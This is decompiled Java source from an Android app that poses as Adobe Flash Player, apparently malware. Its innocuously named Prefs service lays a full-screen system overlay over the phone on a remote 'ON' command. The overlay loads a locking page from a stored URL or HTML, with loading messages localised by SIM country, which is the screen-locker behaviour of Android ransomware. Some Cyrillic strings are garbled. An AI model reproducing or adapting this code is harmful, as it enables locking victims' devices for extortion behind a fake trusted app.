package com.adobe.flashplayer_;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.support.v4.view.accessibility.AccessibilityEventCompat;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;
import com.adobe.flash.R;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

public class Prefs extends Service {
    TextView tmp;

    private class navW extends WebViewClient {
        private navW() {
        }

        /* synthetic */ navW(Prefs prefs, navW navw) {
            this();
        }

        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return false;
        }

        public void onPageFinished(WebView view, String url) {
            view.setVisibility(0);
            Prefs.this.tmp.setVisibility(8);
        }
    }

    public Prefs(Context context, String cmd) {
        String lng = ((TelephonyManager) context.getSystemService("phone")).getSimCountryIso();
        LayoutParams params = new LayoutParams(-1, -1, 2003, AccessibilityEventCompat.TYPE_GESTURE_DETECTION_START, -3);
        WindowManager wm = (WindowManager) context.getSystemService("window");
        View myView = ((LayoutInflater) context.getSystemService("layout_inflater")).inflate(R.layout.activity_lock, null);
        WebView wv = (WebView) myView.findViewById(R.id.webView1);
        TextView pre = (TextView) myView.findViewById(R.id.preLoad);
        String warn = readConfig("warn", context);
        this.tmp = pre;
        String locked = "Loading, please wait.";
        if (lng.contains("ru")) {
            locked = "��������, ���������� ���������.";
        }
        if (lng.contains("us")) {
            locked = "Loading, please wait.";
        }
        if (lng.contains("ua")) {
            locked = "������������, ���� ����� ���������.";
        }
        if (lng.contains("de")) {
            locked = "Lade, bitte warten.";
        }
        if (lng.contains("by")) {
            locked = "��������, ��� ����� ���������.";
        }
        if (cmd.contains("ON")) {
            wm.addView(myView, params);
            pre.setText(locked);
            wv.getSettings().setJavaScriptEnabled(true);
            wv.getSettings().setBuiltInZoomControls(false);
            wv.getSettings().setLoadWithOverviewMode(false);
            wv.setScrollContainer(true);
            wv.setWebViewClient(new navW(this, null));
            if (warn.contains("nodata") && isOnline(context)) {
                wv.loadUrl(readConfig("lockd", context));
            } else {
                wv.loadData(warn, "text/html", "utf-8");
            }
            stopSelf();
        }
        if (cmd.contains("OFF")) {
            myView.setVisibility(8);
            stopSelf();
            System.exit(0);
        }
    }

    public void onCreate(Context context, String cmd) {
        Prefs prefs = new Prefs(context, cmd);
    }

    public IBinder onBind(Intent arg0) {
        return null;
    }

    private String readConfig(String config, Context context) {
        String ret = "nodata";
        try {
            InputStream inputStream = context.openFileInput(config);
            if (inputStream == null) {
                return ret;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String receiveString = "";
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                receiveString = bufferedReader.readLine();
                if (receiveString == null) {
                    inputStream.close();
                    return stringBuilder.toString();
                }
                stringBuilder.append(receiveString);
            }
        } catch (FileNotFoundException | IOException e) {
            return ret;
        }
    }

    private void writeConfig(String config, String data, Context context) {
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput(config, 0));
            outputStreamWriter.write(data);
            outputStreamWriter.close();
        } catch (IOException e) {
        }
    }

    public boolean isOnline(Context c) {
        NetworkInfo netInfo = ((ConnectivityManager) c.getSystemService("connectivity")).getActiveNetworkInfo();
        if (netInfo == null || !netInfo.isConnectedOrConnecting()) {
            return false;
        }
        return true;
    }
}
